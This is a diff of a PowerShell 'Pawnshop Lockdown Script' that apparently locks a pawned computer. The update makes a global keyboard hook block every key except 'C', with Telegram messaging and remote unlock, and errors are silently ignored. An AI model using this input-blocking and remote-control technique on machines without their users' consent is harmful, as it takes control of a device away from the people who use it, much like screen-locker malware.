@@ -1,6 +1,6 @@
 # ==========================
-# Pawnshop Lockdown Script v2.4
-# Telegram Reliable + Key Blocking Improvements
+# Pawnshop Lockdown Script v2.5
+# Blocks All Keys Except 'C' + Telegram Unlock
 # ==========================
 
 # SETTINGS
@@ -32,7 +32,7 @@ function Send-Telegram-Message {
 
 Send-Telegram-Message
 
-# KEYBOARD BLOCKER: All major keys blocked (Alt+Tab, Win, Alt+F4, Win+Tab)
+# KEYBOARD BLOCKER: Block ALL keys except 'C'
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -45,11 +45,6 @@ public class KeyBlocker {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_SYSKEYDOWN = 0x0104;
-    private const int WM_KEYUP = 0x0101;
-    private const int WM_SYSKEYUP = 0x0105;
-
-    private static bool altPressed = false;
-    private static bool winPressed = false;
 
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -71,24 +66,10 @@ public class KeyBlocker {
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0) {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
-
-            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                if (vkCode == 0x43) Environment.Exit(0); // C = emergency close
-                if (vkCode == 0x12) altPressed = true; // ALT
-                if (vkCode == 0x5B || vkCode == 0x5C) winPressed = true; // LWin or RWin
-
-                if ((vkCode == 0x09 && altPressed) || // Alt+Tab
-                    (vkCode == 0x73 && altPressed) || // Alt+F4
-                    (vkCode == 0x09 && winPressed) || // Win+Tab
-                    vkCode == 0x5B || vkCode == 0x5C)  // Win key
-                    return (IntPtr)1;
-            }
-            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
-                if (vkCode == 0x12) altPressed = false;
-                if (vkCode == 0x5B || vkCode == 0x5C) winPressed = false;
-            }
+            if (vkCode == 0x43) Environment.Exit(0); // 'C' key allowed
+            return (IntPtr)1; // Block all other keys
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -133,9 +114,7 @@ $timer.Add_Tick({
                 [System.Windows.Forms.Application]::Exit()
             }
         }
-    } catch {
-        # silently fail and continue
-    }
+    } catch { }
 })
 $timer.Start()
 
